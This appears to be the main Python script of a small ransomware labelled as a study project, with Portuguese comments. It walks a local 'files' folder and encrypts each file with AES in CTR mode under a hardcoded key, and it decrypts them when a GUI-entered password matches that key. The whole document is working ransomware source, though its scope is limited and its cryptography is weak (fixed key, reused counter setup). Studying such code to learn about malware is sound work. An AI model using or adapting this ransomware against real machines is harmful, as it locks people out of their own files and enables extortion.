#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from Crypto.Util import Counter
from gui import pedir_senha
import argparse
import os
import Discovery
import Crypter1

# Chave fixa de 128 bits
HARDCODED_KEY = "0123456789abcdef"

def get_parser():
    parser = argparse.ArgumentParser(description="Ransomware Simples - Estudo")
    parser.add_argument(
        "-d", "--decrypt",
        help="Desencripta os arquivos",
        action="store_true"
    )
    return parser

def main():
    parser = get_parser()
    args = parser.parse_args()
    decrypt = args.decrypt

    key = HARDCODED_KEY.encode()

    # --- MODO DESCRIPTOGRAFIA ---
    if decrypt:
        print("Modo de desencriptação ativado.")
        user_key = pedir_senha()

        if user_key is None:
            print("Operação cancelada.")
            return

        user_key = user_key.encode()

        if user_key != key:
            print("Senha incorreta. Encerrando.")
            return

    # Diretório alvo
    target_dir = os.path.join(os.getcwd(), "files")

    if not os.path.exists(target_dir):
        print("A pasta 'files' não existe.")
        return

    # Inicializa CTR e objeto Crypter
    ctr = Counter.new(128)
    crypt_obj = Crypter1.Crypter(key, ctr)

    cryptoFn = crypt_obj.decrypt if decrypt else crypt_obj.encrypt

    print(f"{'Desencriptando' if decrypt else 'Encriptando'} arquivos em: {target_dir}")

    files = Discovery.discover(target_dir)

    for file in files:
        print("Processando:", file)
        Crypter1.change_files(file, cryptoFn)

    print("Processo finalizado.")

if __name__ == "__main__":
    main()
